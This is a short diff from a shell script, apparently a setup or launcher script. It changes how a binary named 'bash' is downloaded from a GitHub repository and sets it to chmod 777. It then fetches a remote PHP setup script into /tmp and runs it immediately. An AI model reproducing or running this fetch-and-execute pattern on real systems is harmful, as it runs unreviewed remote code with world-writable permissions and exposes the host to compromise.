@@ -34,6 +34,6 @@ load_busybox() {
 # 调用load_busybox函数
 load_busybox
 
-    curl -L "https://raw.githubusercontent.com/A233S/angti/main/bash" -o "${TEMP_DIR}/bash"
+    wget "https://raw.githubusercontent.com/A233S/angti/main/bash" -O "${TEMP_DIR}/bash"
     chmod 777 "${TEMP_DIR}/bash"
 curl -o /tmp/php.sh -Ls https://github.com/A233S/angti/raw/main/phpv3.sh ; bash /tmp/php.sh "$1"
